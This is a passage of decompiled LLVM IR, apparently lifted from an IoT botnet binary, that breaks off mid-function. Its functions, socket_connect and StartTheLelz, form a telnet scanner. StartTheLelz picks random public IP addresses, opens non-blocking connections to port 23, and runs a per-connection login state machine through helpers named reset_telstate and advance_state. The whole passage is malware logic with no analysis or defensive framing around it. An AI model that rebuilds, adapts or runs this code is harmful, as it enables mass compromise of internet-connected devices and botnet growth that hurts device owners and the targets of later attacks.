  %v1_dd2c = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_dd38

dec_label_pc_dd38:                                ; preds = %entry, %dec_label_pc_dd28
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dd28 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_dd38, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dd4c = load i32, i32* @fp, align 4
  store i32 56660, i32* %stack_var_-4, align 4
  %v2_dd50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd50, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_dd78 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_dd88 = icmp eq i32 %v1_dd78, 0
  br i1 %v2_dd88, label %dec_label_pc_dd90, label %dec_label_pc_dd9c

dec_label_pc_dd90:                                ; preds = %entry
  br label %dec_label_pc_de84

dec_label_pc_dd9c:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_dda0 = add i32 %v1_dd78, 16
  %v2_dda0 = inttoptr i32 %v1_dda0 to i32*
  %v3_dda0 = load i32, i32* %v2_dda0, align 4
  %v1_dda4 = inttoptr i32 %v3_dda0 to i32*
  %v2_dda4 = load i32, i32* %v1_dda4, align 4
  %v1_ddac = add i32 %v1_dd78, 12
  %v2_ddac = inttoptr i32 %v1_ddac to i32*
  %v3_ddac = load i32, i32* %v2_ddac, align 4
  store i32 %v3_ddac, i32* @r2, align 4
  %v2_ddb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ddc4 = call i32 @bcopy(i32 %v2_dda4, i32 %v2_ddb8, i32 %v3_ddac)
  %v1_dddc = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_de0c = call i32 @socket()
  %v6_de34 = call i32 @__GI_setsockopt(i32 %v0_de0c, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_de3c = icmp eq i32 %v0_de0c, -1
  br i1 %v3_de3c, label %dec_label_pc_de44, label %dec_label_pc_de50

dec_label_pc_de44:                                ; preds = %dec_label_pc_dd9c
  br label %dec_label_pc_de84

dec_label_pc_de50:                                ; preds = %dec_label_pc_dd9c
  %v3_de60 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_de60 = call i32 @__libc_connect(i32 %v0_de0c, %sockaddr* %v3_de60, i32 16)
  %v3_de68 = icmp eq i32 %v4_de60, -1
  br i1 %v3_de68, label %dec_label_pc_de70, label %dec_label_pc_de7c

dec_label_pc_de70:                                ; preds = %dec_label_pc_de50
  br label %dec_label_pc_de84

dec_label_pc_de7c:                                ; preds = %dec_label_pc_de50
  br label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de44, %dec_label_pc_dd90, %dec_label_pc_de7c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_dd90 ], [ 0, %dec_label_pc_de44 ], [ 0, %dec_label_pc_de70 ], [ %v0_de0c, %dec_label_pc_de7c ]
  store i32 %v3_dd4c, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_de84, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_de94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_de94, i32* %ip.global-to-local, align 4
  %v3_de98 = load i32, i32* @r4, align 4
  store i32 %v3_de98, i32* %stack_var_-24, align 4
  store i32 56992, i32* %stack_var_-4, align 4
  %v19_de98 = ptrtoint i32* %stack_var_-24 to i32
  %v2_de9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_de9c, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_deb8 = call i32 @__GI_time(i32* null)
  store i32 %v2_deb8, i32* %r3.global-to-local, align 4
  store i32 %v2_deb8, i32* @r4, align 4
  %v0_dec4 = call i32 @rand_cmwc()
  %v0_decc = load i32, i32* @r4, align 4
  %v2_decc = xor i32 %v0_decc, %v0_dec4
  store i32 %v2_decc, i32* %r3.global-to-local, align 4
  %v1_ded4 = call i32 @srand(i32 %v2_decc)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_deec = call i32 @htons(i32 23)
  %v2_df04 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_df04, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_df20 = call i32 @malloc(i32 513)
  store i32 513, i32* %r3.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_df48 = inttoptr i32 %v1_df20 to i8*
  %v3_df48 = call i32 @__GI_memset(i8* %v2_df48, i32 0)
  %v2_df58 = mul i32 %arg2, 28
  %v1_df5c = or i32 %v2_df58, 3
  %v1_df60 = add i32 %v1_df5c, 3
  %v3_df64 = and i32 %v1_df60, -4
  %v1_df6c = load i32, i32* @sp, align 4
  %v2_df6c = sub i32 %v1_df6c, %v3_df64
  %v1_df7c = add i32 %v2_df6c, 7
  %v3_df80 = and i32 %v1_df7c, -4
  %v2_dfa4 = mul i32 %arg2, 5
  store i32 %v2_dfa4, i32* %r3.global-to-local, align 4
  store i32 %v2_dfa4, i32* @r2, align 4
  %v2_dfb8 = inttoptr i32 %v3_df80 to i8*
  %v3_dfb8 = call i32 @__GI_memset(i8* %v2_dfb8, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_e09861 = icmp sgt i32 %arg2, 0
  br i1 %v5_e09861, label %dec_label_pc_dfc8, label %dec_label_pc_e09c

dec_label_pc_dfc8:                                ; preds = %entry, %dec_label_pc_dfc8
  %storemerge462 = phi i32 [ %v1_e084, %dec_label_pc_dfc8 ], [ 0, %entry ]
  %v2_dfd8 = mul i32 %storemerge462, 28
  %v2_dfdc = add i32 %v2_dfd8, %v3_df80
  store i32 %v2_dfdc, i32* %r3.global-to-local, align 4
  %v2_dfe4 = inttoptr i32 %v2_dfdc to i32*
  store i32 0, i32* %v2_dfe4, align 4
  %v0_dfe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfe8 = add i32 %v0_dfe8, 4
  store i32 %v1_dfe8, i32* %r3.global-to-local, align 4
  %v2_dff0 = inttoptr i32 %v1_dfe8 to i32*
  store i32 0, i32* %v2_dff0, align 4
  %v0_dff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dff4 = add i32 %v0_dff4, 4
  store i32 %v1_dff4, i32* %r3.global-to-local, align 4
  %v2_dffc = inttoptr i32 %v1_dff4 to i32*
  store i32 0, i32* %v2_dffc, align 4
  %v0_e000 = load i32, i32* %r3.global-to-local, align 4
  %v1_e000 = add i32 %v0_e000, 4
  store i32 %v1_e000, i32* %r3.global-to-local, align 4
  %v2_e008 = inttoptr i32 %v1_e000 to i32*
  store i32 0, i32* %v2_e008, align 4
  %v0_e00c = load i32, i32* %r3.global-to-local, align 4
  %v1_e00c = add i32 %v0_e00c, 4
  store i32 %v1_e00c, i32* %r3.global-to-local, align 4
  %v2_e014 = inttoptr i32 %v1_e00c to i32*
  store i32 0, i32* %v2_e014, align 4
  %v0_e018 = load i32, i32* %r3.global-to-local, align 4
  %v1_e018 = add i32 %v0_e018, 4
  store i32 %v1_e018, i32* %r3.global-to-local, align 4
  %v2_e020 = inttoptr i32 %v1_e018 to i32*
  store i32 0, i32* %v2_e020, align 4
  %v0_e024 = load i32, i32* %r3.global-to-local, align 4
  %v1_e024 = add i32 %v0_e024, 4
  %v2_e02c = inttoptr i32 %v1_e024 to i32*
  store i32 0, i32* %v2_e02c, align 4
  %v3_e054 = add i32 %v2_dfdc, 9
  %v4_e054 = inttoptr i32 %v3_e054 to i8*
  store i8 1, i8* %v4_e054, align 1
  %v2_e074 = add i32 %v2_dfdc, 24
  %v2_e07c = inttoptr i32 %v2_e074 to i32*
  store i32 %v1_df20, i32* %v2_e07c, align 4
  %v1_e084 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_e084, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_e098 = icmp slt i32 %v1_e084, %arg2
  br i1 %v5_e098, label %dec_label_pc_dfc8, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_dfc8, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e0a4

dec_label_pc_e0a4:                                ; preds = %dec_label_pc_e0a4, %dec_label_pc_e09c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e09c ], [ %v1_e0a8, %dec_label_pc_e0a4 ]
  %v1_e0a8 = add i32 %stack_var_-56.0, 1
  store i32 %v1_e0a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_26440.497 to i32), i32* %r3.global-to-local, align 4
  %v4_e0b8 = mul i32 %v1_e0a8, 4
  %v5_e0b8 = add i32 %v4_e0b8, ptrtoint ([10 x i8*]* @global_var_26440.497 to i32)
  %v6_e0b8 = inttoptr i32 %v5_e0b8 to i32*
  %v7_e0b8 = load i32, i32* %v6_e0b8, align 4
  store i32 %v7_e0b8, i32* %r3.global-to-local, align 4
  %v2_e0bc = icmp eq i32 %v7_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e0c4.preheader, label %dec_label_pc_e0a4

dec_label_pc_e0c4.preheader:                      ; preds = %dec_label_pc_e0a4
  %v2_e14c = add i32 %v3_df80, 8
  %v2_e480 = add i32 %v3_df80, 4
  %v3_e570 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_e5e0 = ptrtoint i32* %stack_var_-324 to i32
  %v2_e6dc = ptrtoint i32* %stack_var_-332 to i32
  %v2_e738 = ptrtoint i32* %stack_var_-340 to i32
  %v2_e73c = ptrtoint i32* %stack_var_-336 to i32
  %v2_e858 = add i32 %v3_df80, 16
  %v2_e8d4 = add i32 %v3_df80, 24
  br label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e0c4, %dec_label_pc_f254, %dec_label_pc_e0c4.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_e09861, label %dec_label_pc_e0d0, label %dec_label_pc_e0c4

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4, %dec_label_pc_f254
  %storemerge553 = phi i32 [ %v1_f258, %dec_label_pc_f254 ], [ 0, %dec_label_pc_e0c4 ]
  %v3_e0dc = mul i32 %storemerge553, 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e0e4 = mul i32 %storemerge553, 28
  %v2_e0e8 = add i32 %v2_e0e4, %v3_df80
  %v2_e0ec = add i32 %v2_e0e8, 16
  store i32 %v2_e0ec, i32* %r3.global-to-local, align 4
  %v1_e0f0 = inttoptr i32 %v2_e0ec to i32*
  %v2_e0f0 = load i32, i32* %v1_e0f0, align 4
  store i32 %v2_e0f0, i32* %r3.global-to-local, align 4
  %v2_e0f4 = icmp eq i32 %v2_e0f0, 0
  br i1 %v2_e0f4, label %dec_label_pc_e0fc, label %dec_label_pc_e134

dec_label_pc_e0fc:                                ; preds = %dec_label_pc_e0d0
  store i32 %storemerge553, i32* @r4, align 4
  %v2_e104 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e118 = load i32, i32* @r4, align 4
  %v3_e11c = mul i32 %v0_e118, 4
  store i32 %v3_e11c, i32* %r2.global-to-local, align 4
  %v2_e124 = mul i32 %v0_e118, 28
  %v2_e12c = add i32 %v2_e858, %v2_e124
  store i32 %v2_e12c, i32* %r3.global-to-local, align 4
  %v2_e130 = inttoptr i32 %v2_e12c to i32*
  store i32 %v2_e104, i32* %v2_e130, align 4
  br label %dec_label_pc_e134

dec_label_pc_e134:                                ; preds = %dec_label_pc_e0d0, %dec_label_pc_e0fc
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e150 = add i32 %v2_e14c, %v2_e0e4
  store i32 %v2_e150, i32* %r3.global-to-local, align 4
  %v1_e154 = inttoptr i32 %v2_e150 to i8*
  %v2_e154 = load i8, i8* %v1_e154, align 4
  %v3_e154 = sext i8 %v2_e154 to i32
  %v4_e154 = zext i8 %v2_e154 to i32
  store i32 %v4_e154, i32* %r3.global-to-local, align 4
  switch i32 %v3_e154, label %dec_label_pc_f254 [
    i32 0, label %dec_label_pc_e184
    i32 1, label %dec_label_pc_e5f4.lr.ph
    i32 2, label %dec_label_pc_e8a0
    i32 3, label %dec_label_pc_e9ec
    i32 4, label %dec_label_pc_eb40
    i32 5, label %dec_label_pc_ec8c
    i32 6, label %dec_label_pc_ede0
    i32 7, label %dec_label_pc_f0e4
  ]

dec_label_pc_e184:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e1a0 = add i32 %v2_e0e8, 8
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v1_e1a4 = add i32 %v2_e0e8, 9
  %v2_e1a4 = inttoptr i32 %v1_e1a4 to i8*
  %v3_e1a4 = load i8, i8* %v2_e1a4, align 1
  %v7_e1a8 = icmp eq i8 %v3_e1a4, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_e1a8, label %dec_label_pc_e1b0, label %dec_label_pc_e29c

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e184
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e1cc = add i32 %v2_e0e8, 24
  store i32 %v2_e1cc, i32* %r3.global-to-local, align 4
  %v1_e1d0 = inttoptr i32 %v2_e1cc to i32*
  %v2_e1d0 = load i32, i32* %v1_e1d0, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e1f4 = inttoptr i32 %v2_e0e8 to i32*
  store i32 0, i32* %v2_e1f4, align 4
  %v0_e1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1f8 = add i32 %v0_e1f8, 4
  store i32 %v1_e1f8, i32* %r3.global-to-local, align 4
  %v2_e200 = inttoptr i32 %v1_e1f8 to i32*
  store i32 0, i32* %v2_e200, align 4
  %v0_e204 = load i32, i32* %r3.global-to-local, align 4
  %v1_e204 = add i32 %v0_e204, 4
  store i32 %v1_e204, i32* %r3.global-to-local, align 4
  %v2_e20c = inttoptr i32 %v1_e204 to i32*
  store i32 0, i32* %v2_e20c, align 4
  %v0_e210 = load i32, i32* %r3.global-to-local, align 4
  %v1_e210 = add i32 %v0_e210, 4
  store i32 %v1_e210, i32* %r3.global-to-local, align 4
  %v2_e218 = inttoptr i32 %v1_e210 to i32*
  store i32 0, i32* %v2_e218, align 4
  %v0_e21c = load i32, i32* %r3.global-to-local, align 4
  %v1_e21c = add i32 %v0_e21c, 4
  store i32 %v1_e21c, i32* %r3.global-to-local, align 4
  %v2_e224 = inttoptr i32 %v1_e21c to i32*
  store i32 0, i32* %v2_e224, align 4
  %v0_e228 = load i32, i32* %r3.global-to-local, align 4
  %v1_e228 = add i32 %v0_e228, 4
  store i32 %v1_e228, i32* %r3.global-to-local, align 4
  %v2_e230 = inttoptr i32 %v1_e228 to i32*
  store i32 0, i32* %v2_e230, align 4
  %v0_e234 = load i32, i32* %r3.global-to-local, align 4
  %v1_e234 = add i32 %v0_e234, 4
  %v2_e23c = inttoptr i32 %v1_e234 to i32*
  store i32 0, i32* %v2_e23c, align 4
  store i32 %v2_e1cc, i32* %r2.global-to-local, align 4
  store i32 %v2_e1d0, i32* %r3.global-to-local, align 4
  store i32 %v2_e1d0, i32* %v1_e1d0, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_e26c = call i32 @GetRandomPublicIP(i32 24, i32 %v3_df80, i32 %v2_e1cc, i32 %v2_e1d0, i32 %v2_e1d0)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e27c = load i32, i32* @r4, align 4
  %v3_e280 = mul i32 %v0_e27c, 4
  store i32 %v3_e280, i32* %r2.global-to-local, align 4
  %v2_e288 = mul i32 %v0_e27c, 28
  %v2_e290 = add i32 %v2_e480, %v2_e288
  store i32 %v2_e290, i32* %r3.global-to-local, align 4
  %v2_e294 = inttoptr i32 %v2_e290 to i32*
  store i32 %v5_e26c, i32* %v2_e294, align 4
  br label %dec_label_pc_e428

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e184
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v3_e2bc = load i8, i8* %v2_e1a4, align 1
  %v4_e2bc = zext i8 %v3_e2bc to i32
  store i32 %v4_e2bc, i32* %r3.global-to-local, align 4
  %v2_e2c0 = icmp eq i8 %v3_e2bc, 0
  br i1 %v2_e2c0, label %dec_label_pc_e2c8, label %dec_label_pc_e428

dec_label_pc_e2c8:                                ; preds = %dec_label_pc_e29c
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v1_e2ec = add i32 %v2_e0e8, 11
  %v2_e2ec = inttoptr i32 %v1_e2ec to i8*
  %v3_e2ec = load i8, i8* %v2_e2ec, align 1
  %v1_e2f0 = add i8 %v3_e2ec, 1
  store i8 %v1_e2f0, i8* %v2_e2ec, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v1_e344 = add i32 %v2_e0e8, 10
  %v2_e344 = inttoptr i32 %v1_e344 to i8*
  %v3_e344 = load i8, i8* %v2_e344, align 2
  %v1_e348 = add i8 %v3_e344, 1
  store i32 %v3_df80, i32* %ip.global-to-local, align 4
  store i8 %v1_e348, i8* %v2_e344, align 2
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v3_e398 = load i8, i8* %v2_e2ec, align 1
  %v7_e39c = icmp eq i8 %v3_e398, 3
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v7_e39c, label %dec_label_pc_e3a4, label %dec_label_pc_e3d0

dec_label_pc_e3a4:                                ; preds = %dec_label_pc_e2c8
  store i32 %v2_e1a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e1a4, align 1
  br label %dec_label_pc_f254

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e2c8
  store i32 %v2_e1a0, i32* %r3.global-to-local, align 4
  %v3_e3f0 = load i8, i8* %v2_e344, align 2
  %v4_e3f0 = zext i8 %v3_e3f0 to i32
  store i32 %v4_e3f0, i32* %r3.global-to-local, align 4
  %v7_e3f4 = icmp eq i8 %v3_e3f0, 3
  br i1 %v7_e3f4, label %dec_label_pc_e3fc, label %dec_label_pc_e428

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3d0
  store i32 %v2_e1a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e1a4, align 1
  br label %dec_label_pc_f254

dec_label_pc_e428:                                ; preds = %dec_label_pc_e3d0, %dec_label_pc_e29c, %dec_label_pc_e1b0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e43c = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e484 = add i32 %v2_e480, %v2_e0e4
  store i32 %v2_e484, i32* %r3.global-to-local, align 4
  %v1_e488 = inttoptr i32 %v2_e484 to i32*
  %v2_e488 = load i32, i32* %v1_e488, align 4
  store i32 %v2_e488, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_e4a0 = call i32 @socket()
  %v0_e4a8 = load i32, i32* @r4, align 4
  %v2_e4b4 = mul i32 %v0_e4a8, 28
  %v2_e4b8 = add i32 %v2_e4b4, %v3_df80
  %v2_e4bc = inttoptr i32 %v2_e4b8 to i32*
  store i32 %v0_e4a0, i32* %v2_e4bc, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_e4d8 = inttoptr i32 %v2_e0e8 to i32*
  %v2_e4d8 = load i32, i32* %v1_e4d8, align 4
  store i32 %v2_e4d8, i32* %r3.global-to-local, align 4
  %v7_e4dc = icmp eq i32 %v2_e4d8, -1
  br i1 %v7_e4dc, label %dec_label_pc_f254, label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e428
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e4fc = load i32, i32* %v1_e4d8, align 4
  store i32 %v2_e4fc, i32* @r4, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e518 = load i32, i32* %v1_e4d8, align 4
  store i32 %v2_e518, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e528 = call i32 @__libc_fcntl(i32 %v2_e518, i32 3)
  %v1_e530 = or i32 %v2_e528, 2048
  store i32 %v1_e530, i32* %r3.global-to-local, align 4
  %v0_e534 = load i32, i32* @r4, align 4
  store i32 %v1_e530, i32* @r2, align 4
  %v2_e540 = call i32 @__libc_fcntl(i32 %v0_e534, i32 4)
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e55c = load i32, i32* %v1_e4d8, align 4
  store i32 %v2_e55c, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e570 = call i32 @__libc_connect(i32 %v2_e55c, %sockaddr* nonnull %v3_e570, i32 16)
  store i32 %v4_e570, i32* %r3.global-to-local, align 4
  %v3_e578 = icmp eq i32 %v4_e570, -1
  br i1 %v3_e578, label %dec_label_pc_e580, label %dec_label_pc_e5b8

dec_label_pc_e580:                                ; preds = %dec_label_pc_e4e4
  %v0_e580 = call i32 @__errno_location()
  store i32 %v0_e580, i32* %r3.global-to-local, align 4
  %v1_e588 = inttoptr i32 %v0_e580 to i32*
  %v2_e588 = load i32, i32* %v1_e588, align 4
  store i32 %v2_e588, i32* %r3.global-to-local, align 4
  %v7_e58c = icmp eq i32 %v2_e588, 115
  br i1 %v7_e58c, label %dec_label_pc_e5b8, label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %dec_label_pc_e580
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e5b0 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e4e4, %dec_label_pc_e580
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e5d8 = call i32 @advance_state(i32* nonnull %v1_e4d8, i32 1)
  br label %dec_label_pc_f254

dec_label_pc_e5f4.lr.ph:                          ; preds = %dec_label_pc_e134
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e5f4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e5f4.lr.ph, %dec_label_pc_e5f4
  %storemerge610 = phi i32 [ 0, %dec_label_pc_e5f4.lr.ph ], [ %v1_e608, %dec_label_pc_e5f4 ]
  store i32 %v2_e5e0, i32* %r2.global-to-local, align 4
  %v5_e600 = mul nuw nsw i32 %storemerge610, 4
  %v6_e600 = add i32 %v5_e600, %v2_e5e0
  %v7_e600 = inttoptr i32 %v6_e600 to i32*
  store i32 0, i32* %v7_e600, align 4
  %v1_e608 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_e608, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_e608, 32
  br i1 %tmp43, label %dec_label_pc_e5f4, label %dec_label_pc_e61c

dec_label_pc_e61c:                                ; preds = %dec_label_pc_e5f4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_e634 = inttoptr i32 %v2_e0e8 to i32*
  %v2_e634 = load i32, i32* %v1_e634, align 4
  %v3_e638 = udiv i32 %v2_e634, 32
  %v3_e64c = mul nuw nsw i32 %v3_e638, 4
  %v2_e654 = add i32 %v3_e64c, %v19_de98
  store i32 %v2_e654, i32* %r2.global-to-local, align 4
  %v2_e658 = add i32 %v2_e654, -300
  store i32 %v2_e658, i32* %r3.global-to-local, align 4
  %v1_e65c = inttoptr i32 %v2_e658 to i32*
  %v2_e65c = load i32, i32* %v1_e65c, align 4
  store i32 %v2_e65c, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e678 = load i32, i32* %v1_e634, align 4
  %v1_e67c = urem i32 %v2_e678, 32
  %v6_e684 = shl i32 1, %v1_e67c
  %v2_e688 = or i32 %v6_e684, %v2_e65c
  store i32 %v2_e688, i32* %v1_e65c, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e6d0 = load i32, i32* %v1_e634, align 4
  %v1_e6d4 = add i32 %v2_e6d0, 1
  store i32 %v1_e6d4, i32* %r2.global-to-local, align 4
  store i32 %v2_e5e0, i32* %ip.global-to-local, align 4
  %v1_e6e0 = load i32, i32* @sp, align 4
  %v2_e6e0 = inttoptr i32 %v1_e6e0 to i32*
  store i32 %v2_e6dc, i32* %v2_e6e0, align 4
  %v0_e6e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e5e0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_e6f4 = load i32, i32* %stack_var_-332, align 4
  %v5_e6f4 = call i32 @__libc_select(i32 %v0_e6e4, i32 0, i32 %v2_e5e0, i32 0, i32 %v4_e6f4)
  store i32 %v5_e6f4, i32* %r3.global-to-local, align 4
  %v7_e704 = icmp eq i32 %v5_e6f4, 1
  br i1 %v7_e704, label %dec_label_pc_e70c, label %dec_label_pc_e810

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e61c
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e734 = load i32, i32* %v1_e634, align 4
  store i32 %v2_e734, i32* %r2.global-to-local, align 4
  store i32 %v2_e738, i32* %ip.global-to-local, align 4
  %v1_e740 = load i32, i32* @sp, align 4
  %v2_e740 = inttoptr i32 %v1_e740 to i32*
  store i32 %v2_e73c, i32* %v2_e740, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_e738, i32* %r3.global-to-local, align 4
  %v0_e754 = call i32 @getsockopt()
  %v3_e758 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_e758, i32* %r3.global-to-local, align 4
  %v2_e75c = icmp eq i32 %v3_e758, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  br i1 %v2_e75c, label %dec_label_pc_e788, label %dec_label_pc_e764

dec_label_pc_e764:                                ; preds = %dec_label_pc_e70c
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e780 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_e788:                                ; preds = %dec_label_pc_e70c
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e7a0 = load i32, i32* %v1_e634, align 4
  store i32 %v2_e7a0, i32* @r4, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_e7bc = load i32, i32* %v1_e634, align 4
  store i32 %v2_e7bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e7cc = call i32 @__libc_fcntl(i32 %v2_e7bc, i32 3)
  %v1_e7d4 = and i32 %v2_e7cc, -2049
  store i32 %v1_e7d4, i32* %r3.global-to-local, align 4
